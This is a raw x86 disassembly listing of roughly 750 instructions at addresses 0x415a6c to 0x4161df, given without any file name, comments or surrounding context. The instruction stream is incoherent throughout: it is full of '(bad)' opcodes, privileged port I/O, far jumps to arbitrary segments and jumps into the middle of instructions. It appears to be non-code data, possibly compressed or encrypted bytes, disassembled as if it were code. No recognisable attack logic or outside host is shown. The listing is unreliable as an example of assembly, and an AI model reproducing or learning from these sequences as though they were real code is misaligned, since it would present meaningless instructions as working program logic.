  415a6c:	and    eax,0xf37188d7
  415a71:	sub    eax,0x87de1ec7
  415a76:	repnz in eax,0x93
  415a79:	ja     0x415aa4
  415a7b:	inc    edx
  415a7c:	aaa    
  415a7d:	stc    
  415a7e:	xor    BYTE PTR [ecx+0x3f],dh
  415a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a82:	pop    edx
  415a83:	jb     0x415a2b
  415a85:	jnp    0x415a6a
  415a87:	pusha  
  415a88:	push   ss
  415a89:	loop   0x415ac4
  415a8b:	or     bl,ah
  415a8d:	ja     0x415ade
  415a8f:	lds    esi,FWORD PTR [edx]
  415a91:	test   al,0xfa
  415a93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a94:	and    eax,0xfdc58409
  415a99:	mov    ebx,eax
  415a9b:	test   bh,al
  415a9d:	dec    esi
  415a9e:	pushf  
  415a9f:	jle    0x415a63
  415aa1:	loope  0x415a5d
  415aa3:	out    0xb8,eax
  415aa5:	jle    0x415a54
  415aa7:	jb     0x415a95
  415aa9:	outs   dx,DWORD PTR ds:[esi]
  415aaa:	mul    DWORD PTR fs:[edx*2-0x3c89643f]
  415ab2:	arpl   WORD PTR [ecx+0x608379ae],bp
  415ab8:	sbb    al,0x6b
  415aba:	iret   
  415abb:	in     eax,0xe6
  415abd:	pop    ecx
  415abe:	jl     0x415b33
  415ac0:	(bad)  
  415ac1:	aaa    
  415ac2:	out    dx,al
  415ac3:	addr16 ja 0x415a9c
  415ac6:	xor    DWORD PTR [ebx-0x50b435a6],esp
  415acc:	repz mul DWORD PTR [ecx-0x6a]
  415ad0:	in     eax,0xd6
  415ad2:	repz xor edx,DWORD PTR [edi-0x6b2928ac]
  415ad9:	mov    dh,dh
  415adb:	jmp    0x415a92
  415add:	sti    
  415ade:	scas   al,BYTE PTR es:[edi]
  415adf:	inc    ecx
  415ae0:	jnp    0x415b16
  415ae2:	neg    DWORD PTR [edx]
  415ae4:	jmp    0x415b46
  415ae6:	mov    ds:0xdec0fb25,eax
  415aeb:	repnz popa 
  415aed:	test   BYTE PTR [edx-0x8de3c76],ch
  415af3:	shr    BYTE PTR [ecx+0x75],0x36
  415af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415af8:	jmp    0xe45ac8cb
  415afd:	arpl   WORD PTR [esi],dx
  415aff:	cmp    al,0xb0
  415b01:	outs   dx,DWORD PTR ds:[esi]
  415b02:	sahf   
  415b03:	pop    edx
  415b04:	inc    ecx
  415b05:	mov    DWORD PTR [esi-0x36163c49],ecx
  415b0b:	or     ch,BYTE PTR [ecx-0x2c]
  415b0e:	sahf   
  415b0f:	jne    0x415b6f
  415b11:	add    eax,DWORD PTR [esi+0x46f2d204]
  415b17:	inc    edx
  415b18:	daa    
  415b19:	les    ebp,FWORD PTR [esi+0x294f8a95]
  415b1f:	mov    ds:0x9af77ae3,al
  415b24:	sub    BYTE PTR ds:0xcd4283e5,al
  415b2a:	xchg   ecx,eax
  415b2b:	pop    ds
  415b2c:	outs   dx,BYTE PTR ds:[esi]
  415b2d:	fsubr  DWORD PTR [edi]
  415b2f:	test   DWORD PTR [eax],esp
  415b31:	xchg   esi,eax
  415b32:	in     eax,0xd4
  415b34:	into   
  415b35:	popf   
  415b36:	mov    dh,0x25
  415b38:	repnz scas eax,DWORD PTR es:[edi]
  415b3a:	push   ds
  415b3b:	add    edi,DWORD PTR es:[ebx]
  415b3e:	and    eax,0x1e81d04a
  415b43:	fcom   DWORD PTR [ebx-0x7c2a3536]
  415b49:	adc    al,0xc3
  415b4b:	ins    BYTE PTR es:[edi],dx
  415b4c:	push   cs
  415b4d:	and    cl,BYTE PTR [ebp+0x134bb2a2]
  415b53:	pop    ebx
  415b54:	in     al,dx
  415b55:	clc    
  415b56:	mov    bh,BYTE PTR [ebx+esi*2+0x1b6499ee]
  415b5d:	pusha  
  415b5e:	in     al,dx
  415b5f:	test   eax,0xd0110bd7
  415b64:	stos   BYTE PTR es:[edi],al
  415b65:	fst    DWORD PTR [edi+0x24]
  415b68:	inc    ecx
  415b69:	adc    eax,0x5913edd3
  415b6e:	ja     0x415af8
  415b70:	adc    bl,ch
  415b72:	cmp    dl,BYTE PTR [ecx+edi*1-0x6d]
  415b76:	ja     0x415b49
  415b78:	outs   dx,BYTE PTR ds:[esi]
  415b79:	enter  0x8d61,0xff
  415b7d:	jno    0x415b38
  415b7f:	(bad)  
  415b80:	or     ebx,edx
  415b82:	int3   
  415b83:	xor    DWORD PTR [ebx-0x7422c79],ecx
  415b89:	cwde   
  415b8a:	or     al,BYTE PTR [eax]
  415b8c:	mov    bl,0x81
  415b8e:	pop    edi
  415b8f:	pusha  
  415b90:	fst    DWORD PTR [ecx+0x17]
  415b93:	daa    
  415b94:	push   ebp
  415b95:	pop    esi
  415b96:	cli    
  415b97:	bound  ebp,QWORD PTR [edi-0x61edcc69]
  415b9d:	les    edi,FWORD PTR [ecx-0x1e34a0ab]
  415ba3:	das    
  415ba4:	call   0x8fff:0x5402b6d5
  415bab:	add    eax,0x4ce77c25
  415bb0:	xor    ebx,ebp
  415bb2:	hlt    
  415bb3:	or     ebp,esp
  415bb5:	dec    bp
  415bb7:	call   0xfba6fd4b
  415bbc:	cmp    ah,0x43
  415bbf:	pop    ds
  415bc0:	int3   
  415bc1:	retf   0xbb7f
  415bc4:	(bad)  
  415bc6:	(bad)  
  415bc7:	push   esp
  415bc8:	add    BYTE PTR [ecx-0x3f3a210c],ah
  415bce:	xchg   esi,eax
  415bcf:	(bad)  
  415bd0:	mov    eax,ds:0x4be86885
  415bd5:	jl     0x415bce
  415bd7:	push   ds
  415bd8:	adc    esp,DWORD PTR [esi+0xca88214]
  415bde:	push   0x75a9b07f
  415be3:	push   eax
  415be4:	push   es
  415be5:	sub    ebp,0x12
  415be8:	pop    ebp
  415be9:	push   cs
  415bea:	mov    ebx,0xf1dd19bb
  415bef:	(bad)  
  415bf0:	jg     0x415c22
  415bf2:	ins    DWORD PTR es:[edi],dx
  415bf3:	outs   dx,BYTE PTR ds:[esi]
  415bf4:	xchg   BYTE PTR [ecx+0x19d4db3c],dh
  415bfa:	retf   
  415bfb:	jns    0x415c3d
  415bfd:	mov    eax,ds:0xf91b00b0
  415c02:	hlt    
  415c03:	loopne 0x415c30
  415c05:	clc    
  415c06:	jle    0x415c39
  415c08:	xor    eax,0x919d1843
  415c0d:	dec    ecx
  415c0e:	lods   al,BYTE PTR ds:[esi]
  415c0f:	adc    edx,ebx
  415c11:	xor    eax,eax
  415c13:	std    
  415c14:	sub    DWORD PTR [edi+0x29],esp
  415c17:	test   al,0x67
  415c19:	pop    es
  415c1a:	jno    0x415bba
  415c1c:	mov    ?,WORD PTR [ebp-0x21]
  415c1f:	bound  edi,QWORD PTR [edx+eiz*2-0x45]
  415c23:	outs   dx,BYTE PTR ds:[esi]
  415c24:	lahf   
  415c25:	cmp    eax,0xb08fd7ad
  415c2a:	push   esp
  415c2b:	or     al,0xd2
  415c2d:	xchg   esp,eax
  415c2e:	add    ecx,DWORD PTR [edi]
  415c30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c31:	jnp    0x415c17
  415c33:	cmp    esi,DWORD PTR [edi]
  415c35:	inc    ebx
  415c36:	push   ss
  415c37:	dec    ebp
  415c38:	xchg   esp,eax
  415c39:	popf   
  415c3a:	fcomp  QWORD PTR [edx-0x1c]
  415c3d:	out    0xbf,al
  415c3f:	add    DWORD PTR [edx+0x783ea469],eax
  415c45:	dec    esp
  415c46:	js     0x415be8
  415c48:	aaa    
  415c49:	mov    edx,0x420e994c
  415c4e:	mov    BYTE PTR [edi+ebp*1],0xd2
  415c52:	out    0x70,al
  415c54:	pusha  
  415c55:	xor    DWORD PTR [eax],ebp
  415c57:	sub    DWORD PTR [eax-0x36],esp
  415c5a:	xchg   edi,eax
  415c5b:	lock mov bl,0xb8
  415c5e:	popa   
  415c5f:	cwde   
  415c60:	sub    DWORD PTR [edx],edx
  415c62:	in     al,0xd
  415c64:	xor    al,0xa2
  415c66:	or     al,0x8f
  415c68:	push   edx
  415c69:	push   ebx
  415c6a:	xor    al,0x73
  415c6c:	mov    ebx,0x562c9996
  415c71:	xchg   esi,eax
  415c72:	sahf   
  415c73:	call   0x8aebaaf7
  415c78:	arpl   WORD PTR [ebx],ax
  415c7a:	shl    BYTE PTR [edi+0x4e4023e3],0xbe
  415c81:	jp     0x415c9d
  415c83:	jne    0x415c9d
  415c85:	mov    ebx,0x25646d3
  415c8a:	inc    ebx
  415c8b:	sbb    al,0xcc
  415c8d:	test   al,0x35
  415c8f:	jb     0x415cd9
  415c91:	pop    edx
  415c92:	aas    
  415c93:	pop    DWORD PTR [ebx-0x3503c630]
  415c99:	pop    edx
  415c9a:	cmp    DWORD PTR [edi],ecx
  415c9c:	pop    ebp
  415c9d:	pop    edi
  415c9e:	sub    edi,DWORD PTR [edx+0x2797fb24]
  415ca4:	and    eax,esi
  415ca6:	iret   
  415ca7:	pop    esi
  415ca8:	mov    ds,WORD PTR [ebp+0xaf77af4]
  415cae:	rcr    BYTE PTR [ebp-0x8322835],0xc1
  415cb5:	xchg   esi,eax
  415cb6:	sub    ebp,eax
  415cb8:	inc    esi
  415cb9:	add    eax,0xa8f50178
  415cbe:	rsm    
  415cc0:	fst    DWORD PTR [edi+0x6f]
  415cc3:	ja     0x415c7c
  415cc5:	(bad)  
  415cc6:	pop    ss
  415cc7:	push   ss
  415cc8:	sub    dh,BYTE PTR [esp+ebx*8+0x26]
  415ccc:	scas   eax,DWORD PTR es:[edi]
  415ccd:	(bad)  
  415cce:	stc    
  415ccf:	mul    BYTE PTR [ebp+0x8]
  415cd2:	sub    BYTE PTR [eax],ah
  415cd4:	sahf   
  415cd5:	push   ss
  415cd6:	cdq    
  415cd7:	nop
  415cd8:	sar    ah,cl
  415cda:	retf   
  415cdb:	mov    esi,DWORD PTR [ecx+0x6a]
  415cde:	sub    BYTE PTR [ebp+0x20],0x70
  415ce2:	out    0xc5,al
  415ce4:	mov    esi,0x892d3805
  415ce9:	test   eax,0x99affeb0
  415cee:	sub    DWORD PTR ds:0xb31ed1da,edx
  415cf4:	retf   
  415cf5:	add    BYTE PTR [ebx-0x39],bl
  415cf8:	fsubr  QWORD PTR [ecx+0x2cc363f3]
  415cfe:	out    0xa,al
  415d00:	outs   dx,BYTE PTR ds:[esi]
  415d01:	imul   eax,DWORD PTR [esp+edx*1-0x9d20b9],0x6e
  415d09:	mov    cl,BYTE PTR [eax+0x6530a412]
  415d0f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d11:	mov    ah,0xd3
  415d13:	mov    ebx,0xcb1e07cb
  415d18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d19:	jmp    0xae90:0x9cd44048
  415d20:	add    eax,0xb691e6e1
  415d25:	mov    ?,esi
  415d27:	pop    es
  415d28:	push   ds
  415d29:	or     al,0xe1
  415d2b:	mov    ds,WORD PTR [edi+0x73]
  415d2e:	(bad)  
  415d30:	push   ebp
  415d31:	jle    0x415d5e
  415d33:	in     eax,dx
  415d34:	aas    
  415d35:	mov    esi,edi
  415d37:	cmp    eax,0x64a5505d
  415d3c:	cmp    eax,0x9d1217a6
  415d41:	(bad)  
  415d42:	stc    
  415d43:	dec    ebp
  415d44:	repz sbb cl,BYTE PTR [edx]
  415d47:	mov    edi,0x6620b7ed
  415d4c:	sbb    al,al
  415d4e:	(bad)
  415d51:	mov    BYTE PTR [ebx-0x7a000b32],bh
  415d57:	lock imul esp,DWORD PTR [esi+0x70dfd9a2],0xffffff8a
  415d5f:	iret   
  415d60:	add    BYTE PTR [eax],al
  415d62:	adc    esi,DWORD PTR ds:[edx]
  415d65:	imul   edi,DWORD PTR [esp+eiz*4],0x16
  415d69:	popa   
  415d6a:	xor    al,0x94
  415d6c:	sbb    al,0x25
  415d6e:	dec    edx
  415d6f:	dec    edx
  415d70:	out    0x52,al
  415d72:	and    al,0x76
  415d74:	mov    al,0x89
  415d76:	add    al,0xc5
  415d78:	fldenv [edi+eiz*8+0x6d06d04]
  415d7f:	imul   esp,DWORD PTR [eax],0x37bca7db
  415d85:	ss jae 0x415db5
  415d88:	push   ebp
  415d89:	pop    edi
  415d8a:	out    0xad,al
  415d8c:	(bad)  
  415d8d:	or     ebx,DWORD PTR [edi+0x1ba2f947]
  415d93:	lods   al,BYTE PTR ds:[esi]
  415d94:	fsub   st(6),st
  415d96:	in     al,0x58
  415d98:	jne    0x415dd3
  415d9a:	shl    esp,1
  415d9c:	jne    0x415d4a
  415d9e:	xor    DWORD PTR ds:0x7a2787f9,ecx
  415da4:	aam    0xd1
  415da6:	mov    BYTE PTR ds:0x29eaeec5,0xa3
  415dad:	cli    
  415dae:	mul    bl
  415db0:	iret   
  415db1:	ds aas 
  415db3:	nop
  415db4:	test   DWORD PTR [bx+di],esp
  415db7:	outs   dx,BYTE PTR ds:[esi]
  415db8:	mov    dh,0xf9
  415dba:	sbb    DWORD PTR [edx-0x77],esp
  415dbd:	sbb    ch,BYTE PTR [edx]
  415dbf:	or     bh,BYTE PTR [edx]
  415dc1:	jle    0x415da9
  415dc3:	or     dl,BYTE PTR [ebx+0x36]
  415dc6:	sub    BYTE PTR [esi+ecx*8+0x63],bl
  415dca:	sub    BYTE PTR [ebx],cl
  415dcc:	dec    edi
  415dcd:	jae    0x415db5
  415dcf:	cld    
  415dd0:	lods   eax,DWORD PTR ds:[esi]
  415dd1:	shl    DWORD PTR [ebx+0x66],cl
  415dd4:	outs   dx,BYTE PTR ds:[esi]
  415dd5:	dec    esi
  415dd6:	test   eax,0xaf273966
  415ddb:	add    dh,BYTE PTR [edi+0x21]
  415dde:	cmp    ecx,ecx
  415de0:	das    
  415de1:	pop    ebx
  415de2:	scas   eax,DWORD PTR es:[edi]
  415de3:	pop    esi
  415de4:	jns    0x415e0f
  415de6:	loopne 0x415df1
  415de8:	cwde   
  415de9:	sti    
  415dea:	jl     0x415dba
  415dec:	sar    esi,cl
  415dee:	cmp    ah,BYTE PTR [ecx-0xe]
  415df1:	ror    BYTE PTR [edx],1
  415df3:	mov    ?,ecx
  415df5:	std    
  415df6:	pop    ds
  415df7:	clc    
  415df8:	rol    edi,cl
  415dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dfb:	and    eax,0x3b62e5fc
  415e00:	rcr    bh,1
  415e02:	sub    ebx,edx
  415e04:	cmp    DWORD PTR [ebp+0x5d211ff8],esi
  415e0a:	es pop es
  415e0c:	sub    eax,0x639524e3
  415e11:	cmp    eax,0xf4cfbc94
  415e16:	jl     0x415e8e
  415e18:	pop    edi
  415e19:	nop
  415e1a:	dec    esp
  415e1b:	mov    BYTE PTR [esi-0x380ddb4],ah
  415e21:	test   BYTE PTR [eax],0xc
  415e24:	mov    ebx,0xaf901ed0
  415e29:	adc    BYTE PTR [edi-0x39c1cb8f],0xc1
  415e30:	addr16 arpl di,cx
  415e33:	xchg   ecx,eax
  415e35:	sahf   
  415e36:	mov    bh,0xb9
  415e38:	jmp    0x415e9f
  415e3a:	jl     0x415e66
  415e3c:	outs   dx,DWORD PTR ds:[esi]
  415e3d:	sub    al,0x26
  415e3f:	in     al,dx
  415e40:	in     al,dx
  415e41:	xchg   edi,eax
  415e42:	mov    WORD PTR [edi-0x563c5e7f],es
  415e48:	fimul  WORD PTR [edi-0x388d41b5]
  415e4e:	lds    eax,FWORD PTR [ebx]
  415e50:	cwde   
  415e51:	into   
  415e52:	inc    ebp
  415e53:	adc    DWORD PTR [ecx+0x63],edi
  415e56:	loope  0x415ebb
  415e58:	(bad)  
  415e59:	mov    bl,0xca
  415e5b:	adc    al,0x69
  415e5d:	adc    al,0x45
  415e5f:	xchg   ebp,edi
  415e61:	stos   BYTE PTR es:[edi],al
  415e62:	sbb    cl,dh
  415e64:	pop    ebp
  415e65:	sub    ah,ah
  415e67:	shl    DWORD PTR [edi+ebp*2+0x45],1
  415e6b:	fld    DWORD PTR [ebx+eiz*1-0x48371dd8]
  415e72:	and    edx,DWORD PTR [eax]
  415e74:	and    BYTE PTR [eax+ebx*4],0x2e
  415e78:	or     esi,DWORD PTR [esi+0x78]
  415e7b:	mov    ebx,0xcf415cee
  415e80:	mul    BYTE PTR [ebp-0x67]
  415e83:	jns    0x415ece
  415e85:	push   es
  415e86:	xchg   ebp,eax
  415e87:	jecxz  0x415e56
  415e89:	iret   
  415e8a:	push   ds
  415e8b:	or     bh,BYTE PTR [edi-0x3dce0f51]
  415e91:	add    cl,dl
  415e93:	fisttp WORD PTR [esi+0x72d6b31b]
  415e99:	xchg   edx,eax
  415e9a:	push   0x7b
  415e9c:	and    DWORD PTR [edi],ecx
  415e9e:	sub    ch,0x83
  415ea1:	les    ebx,FWORD PTR [edi+0x73]
  415ea4:	scas   eax,DWORD PTR es:[edi]
  415ea5:	in     al,dx
  415ea6:	sbb    BYTE PTR [eax+0x71],al
  415ea9:	cld    
  415eaa:	call   0xc6ada50e
  415eaf:	push   eax
  415eb0:	hlt    
  415eb1:	sub    BYTE PTR [ecx+0x3f],dh
  415eb4:	in     eax,0xdd
  415eb6:	imul   esi,DWORD PTR [ecx-0x2854ae66],0x57
  415ebd:	test   al,0x1d
  415ebf:	jns    0x415eef
  415ec1:	add    BYTE PTR [eax],bh
  415ec3:	push   ebp
  415ec4:	dec    edi
  415ec5:	aam    0xd2
  415ec7:	leave  
  415ec8:	or     dl,dl
  415eca:	pop    esp
  415ecb:	hlt    
  415ecc:	cmp    esp,DWORD PTR [edi]
  415ece:	xchg   edi,eax
  415ecf:	jmp    0xe002cc61
  415ed4:	bound  eax,QWORD PTR [ebx+0x54c893c8]
  415eda:	mov    al,ds:0x5fee827d
  415edf:	cld    
  415ee0:	push   ebp
  415ee1:	jbe    0x415f41
  415ee3:	(bad)  
  415ee4:	test   DWORD PTR [esi+0x2f],0xc2d07109
  415eeb:	cwde   
  415eec:	iret   
  415eed:	sar    BYTE PTR [ebp+0x1c],1
  415ef0:	loop   0x415e87
  415ef2:	push   ebx
  415ef3:	loop   0x415f0b
  415ef5:	fwait
  415ef6:	jle    0x415ed7
  415ef8:	test   BYTE PTR [edx],0xde
  415efb:	(bad)
  415eff:	and    ebp,0xffffffbc
  415f02:	jecxz  0x415f4d
  415f04:	stos   BYTE PTR es:[edi],al
  415f05:	inc    edx
  415f06:	add    ecx,DWORD PTR [ebx]
  415f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f09:	ret    
  415f0a:	mov    esi,0x6ea9ac47
  415f0f:	shr    edi,1
  415f11:	inc    esi
  415f12:	xlat   BYTE PTR ds:[ebx]
  415f13:	out    0x48,al
  415f15:	jmp    0x969d:0x3ed1ddae
  415f1c:	mov    edi,0xd4b05043
  415f21:	and    eax,0x1240a7c1
  415f26:	and    edx,ebx
  415f28:	popa   
  415f29:	lods   eax,DWORD PTR ds:[esi]
  415f2a:	jecxz  0x415f4c
  415f2c:	push   esi
  415f2d:	sbb    al,0x83
  415f2f:	adc    cl,bl
  415f31:	cmp    al,0xb
  415f33:	repz pop ecx
  415f35:	xchg   BYTE PTR [edx+0x454c847],bl
  415f3b:	and    dl,bh
  415f3d:	outs   dx,DWORD PTR es:[esi]
  415f3f:	mov    ?,WORD PTR [ecx-0x2f]
  415f42:	sub    DWORD PTR [ebp+0x1b102397],0xfd9bd691
  415f4c:	mov    BYTE PTR [edx-0x443526b1],dl
  415f52:	(bad)  
  415f53:	jmp    0xe0d8:0xfffb542a
  415f5a:	jl     0x415f70
  415f5c:	ja     0x415fd3
  415f5e:	pop    esp
  415f5f:	jmp    0x415f95
  415f61:	loop   0x415fc7
  415f63:	rcr    bh,cl
  415f65:	add    cl,BYTE PTR [edi]
  415f67:	pop    ebx
  415f68:	dec    ebp
  415f69:	sbb    ebx,DWORD PTR [eax-0x23ff9c43]
  415f6f:	mov    ah,0x8b
  415f71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f72:	push   edi
  415f73:	aas    
  415f74:	adc    DWORD PTR [edi+ebp*4+0x2e],esp
  415f78:	pusha  
  415f79:	lods   eax,DWORD PTR ds:[esi]
  415f7a:	mov    WORD PTR [ebx+0x3c15d9a0],ss
  415f80:	jg     0x415fb2
  415f82:	std    
  415f83:	sub    bl,BYTE PTR [ecx+ebp*4]
  415f86:	pop    eax
  415f87:	push   ecx
  415f88:	(bad)  
  415f89:	jns    0x415ff2
  415f8b:	mul    DWORD PTR [esi+0x5dfd56ed]
  415f91:	inc    ecx
  415f92:	add    bl,BYTE PTR [ecx-0x65]
  415f95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f96:	mov    DWORD PTR [ecx+ebp*1+0x2],ebp
  415f9a:	xchg   edi,eax
  415f9b:	mov    eax,ds:0x8eca4cd1
  415fa0:	pop    es
  415fa1:	(bad)  
  415fa2:	sti    
  415fa3:	inc    ebx
  415fa4:	inc    ecx
  415fa5:	pop    ds
  415fa6:	adc    BYTE PTR [edi-0x55f1c338],ah
  415fac:	dec    edi
  415fad:	shl    BYTE PTR [ecx],cl
  415faf:	jg     0x415ffa
  415fb1:	imul   edi,DWORD PTR [esi],0x74
  415fb4:	adc    al,0xa3
  415fb6:	lods   eax,DWORD PTR ds:[esi]
  415fb7:	push   esp
  415fb8:	lods   al,BYTE PTR ds:[esi]
  415fb9:	pop    es
  415fba:	in     al,0xd3
  415fbc:	in     al,0x6b
  415fbe:	mov    dl,0x3
  415fc0:	sbb    BYTE PTR [ebp+0xb8bd463],bl
  415fc6:	sub    esi,edi
  415fc8:	jge    0x415fbc
  415fca:	out    0x3,eax
  415fcc:	aad    0x8a
  415fce:	add    DWORD PTR [edx+edi*4],0xdac56294
  415fd5:	je     0x416012
  415fd7:	js     0x416051
  415fd9:	sbb    al,BYTE PTR [ecx-0x2c]
  415fdc:	dec    eax
  415fdd:	and    al,BYTE PTR [ebp+0x34]
  415fe0:	(bad)  
  415fe1:	jae    0x415fc2
  415fe3:	out    0xa8,al
  415fe5:	jno    0x415fb8
  415fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fe8:	out    dx,eax
  415fe9:	mov    edi,0x3f9f0b20
  415fee:	dec    ebp
  415fef:	or     eax,0xc082de85
  415ff4:	add    eax,0xbd3ab5f4
  415ff9:	jae    0x415fdc
  415ffb:	dec    edi
  415ffc:	jmp    0x1ea9:0x88ec2d6a
  416003:	fwait
  416004:	jmp    0x41604c
  416006:	inc    edi
  416007:	xlat   BYTE PTR ds:[ebx]
  416008:	sbb    BYTE PTR [ebp+0x55b3b601],cl
  41600e:	jge    0x415fc0
  416010:	pop    eax
  416011:	cld    
  416012:	das    
  416013:	jb     0x416049
  416015:	xor    ch,BYTE PTR [esi-0x8cf5aa]
  41601b:	push   esi
  41601c:	dec    BYTE PTR [ebx-0x51]
  41601f:	push   0x18
  416021:	hlt    
  416022:	ds out dx,al
  416024:	fild   QWORD PTR [edx+0x7f272663]
  41602a:	(bad)  
  41602b:	hlt    
  41602c:	push   eax
  41602d:	scas   al,BYTE PTR es:[edi]
  41602e:	push   esi
  41602f:	push   ebx
  416030:	dec    esp
  416031:	push   esp
  416032:	lods   al,BYTE PTR ds:[esi]
  416033:	leave  
  416034:	add    eax,0x2e3d409f
  416039:	jle    0x415ff1
  41603b:	stos   BYTE PTR es:[edi],al
  41603c:	mov    edi,0x32fa940
  416041:	xchg   edi,eax
  416042:	call   0x5de1:0xaaf62b69
  416049:	mov    esi,0xf100cf9f
  41604e:	push   ebx
  41604f:	cmp    esp,eax
  416051:	pop    ds
  416052:	cmp    al,0x7c
  416054:	jmp    0x6be25c20
  416059:	push   ebx
  41605a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41605b:	push   cs
  41605c:	cmp    al,0x2
  41605f:	push   edx
  416060:	outs   dx,DWORD PTR ds:[esi]
  416061:	outs   dx,BYTE PTR ds:[esi]
  416062:	xor    bl,dh
  416064:	jnp    0x415ffc
  416066:	lock jmp 0xf6fc36da
  41606c:	(bad)  
  41606e:	cmp    al,0xf2
  416070:	mov    esp,0xf08e4e86
  416075:	ud0    edi,DWORD PTR [esp+edi*4]
  416079:	push   ss
  41607a:	jne    0x416063
  41607c:	adc    dh,ah
  41607e:	mov    ecx,esi
  416080:	sub    bh,dh
  416082:	test   ebp,ebx
  416084:	xchg   ebx,eax
  416085:	xchg   DWORD PTR [eax-0x3d],edi
  416088:	(bad)  
  416089:	jp     0x4160c3
  41608b:	jne    0x416043
  41608d:	sahf   
  41608e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41608f:	daa    
  416090:	xchg   ecx,eax
  416091:	sub    ebp,DWORD PTR [ebx+ebx*4+0x3c]
  416095:	popa   
  416096:	dec    ecx
  416097:	adc    bl,dl
  416099:	jbe    0x4160c2
  41609b:	and    ebp,DWORD PTR [eax]
  41609d:	shl    BYTE PTR [edx-0x64],cl
  4160a0:	and    dh,BYTE PTR [edi]
  4160a2:	mov    eax,ds:0xd10068c8
  4160a7:	mov    ds:0xb304ec25,al
  4160ac:	add    ecx,DWORD PTR [ecx+0x60dcc0f1]
  4160b2:	int3   
  4160b3:	or     esp,DWORD PTR [eax]
  4160b5:	xchg   ecx,eax
  4160b6:	call   0x1f0a:0x86bc4638
  4160bd:	popf   
  4160be:	jo     0x416041
  4160c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160c1:	xor    esi,DWORD PTR [eax+0x7973d1b9]
  4160c7:	fisttp WORD PTR [edx+0x2f]
  4160ca:	xchg   edi,eax
  4160cb:	out    dx,eax
  4160cc:	call   0x8425a755
  4160d1:	enter  0x70cc,0x3a
  4160d5:	or     BYTE PTR [edi],0x35
  4160d8:	loopne 0x4160fe
  4160da:	mov    edx,0x27d78e7
  4160df:	repz jmp 0x4160e2
  4160e2:	mov    eax,ds:0xc78ae2d2
  4160e7:	stos   BYTE PTR es:[edi],al
  4160e8:	jl     0x416128
  4160ea:	and    BYTE PTR [eax],bh
  4160ec:	dec    ecx
  4160ed:	bound  edi,QWORD PTR [esi+0x7e]
  4160f0:	in     eax,dx
  4160f1:	jnp    0x41608e
  4160f3:	cs jmp 0x416175
  4160f6:	mov    esp,eax
  4160f8:	cwde   
  4160f9:	outs   dx,DWORD PTR ds:[esi]
  4160fa:	jbe    0x416141
  4160fc:	mov    dl,0x34
  4160fe:	jg     0x416149
  416100:	dec    ebx
  416101:	sub    al,0x39
  416103:	pop    edx
  416104:	jo     0x416094
  416106:	xor    eax,0xaa4978ab
  41610b:	in     eax,0x7f
  41610d:	inc    eax
  41610e:	mov    eax,ds:0x437ecdda
  416113:	daa    
  416114:	or     al,BYTE PTR gs:[esi-0x66]
  416118:	daa    
  416119:	xchg   esi,eax
  41611a:	push   cs
  41611b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41611c:	popa   
  41611d:	mov    ah,0xcc
  41611f:	stc    
  416120:	cwde   
  416121:	sub    BYTE PTR [eax-0x23d2ef19],bl
  416127:	xchg   ebp,eax
  416128:	mov    DWORD PTR [ecx+0x1c07904d],ebp
  41612e:	push   ax
  416130:	mov    esi,0xa61d8fa7
  416135:	push   edx
  416136:	(bad)  
  416137:	push   ebx
  416138:	mov    ebp,0x935f2b64
  41613d:	mov    ecx,0x3628cdc6
  416142:	add    BYTE PTR [ecx],cl
  416144:	aas    
  416145:	cmp    eax,0x64cb891b
  41614a:	sub    eax,0x91e9a038
  41614f:	imul   ebx,esp,0xffffffa4
  416152:	(bad)  
  416153:	outs   dx,BYTE PTR ds:[esi]
  416154:	and    eax,0xfcb13234
  416159:	pop    edx
  41615a:	dec    esi
  41615b:	aad    0xd7
  41615d:	pop    edx
  41615e:	loop   0x4161ce
  416160:	in     al,0xd4
  416162:	ret    0xfe9c
  416165:	vprotw ymm4,xmm6,0x13
  41616b:	outs   dx,DWORD PTR ds:[esi]
  41616c:	sub    al,0xb8
  41616e:	xor    DWORD PTR [edi-0x3a],eax
  416171:	sub    eax,0xb9c1c7c3
  416176:	test   al,0x11
  416178:	popa   
  416179:	icebp  
  41617a:	pushf  
  41617b:	in     al,dx
  41617c:	in     al,0x3c
  41617e:	call   0xc36ba8d4
  416183:	aaa    
  416184:	not    BYTE PTR [edi+0x2073466]
  41618a:	pop    esp
  41618b:	les    ecx,FWORD PTR [edi]
  41618d:	cmp    al,0xc1
  41618f:	call   0x2d2f55c2
  416194:	mov    ah,0xb4
  416196:	ret    0x1fed
  416199:	and    eax,esi
  41619b:	jg     0x416149
  41619d:	pop    es
  41619e:	mov    ebx,0x76c5e21f
  4161a3:	push   eax
  4161a4:	mov    ecx,DWORD PTR [ecx+0xc]
  4161a7:	push   ebx
  4161a8:	aam    0x56
  4161aa:	mov    dl,0x38
  4161ac:	jl     0x41617a
  4161ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161af:	mov    ecx,DWORD PTR [edx]
  4161b1:	push   es
  4161b2:	push   ds
  4161b3:	xchg   ah,dl
  4161b5:	pop    es
  4161b6:	adc    BYTE PTR [edx+0x14ed5be6],dl
  4161bc:	stos   DWORD PTR es:[edi],eax
  4161bd:	cmc    
  4161be:	nop
  4161bf:	dec    edi
  4161c0:	cmc    
  4161c1:	sub    al,0xfe
  4161c3:	inc    ebp
  4161c4:	jg     0x416225
  4161c6:	sub    ah,BYTE PTR [eax+0x48]
  4161c9:	test   al,0x54
  4161cb:	mov    edi,0x75b727c1
  4161d0:	push   cs
  4161d1:	xor    BYTE PTR [esi+0x2c],bl
  4161d4:	or     eax,0x5b9bfa45
  4161d9:	mov    eax,ds:0xa3f1d217
  4161de:	xlat   BYTE PTR ds:[ebx]
  4161df:	aas    
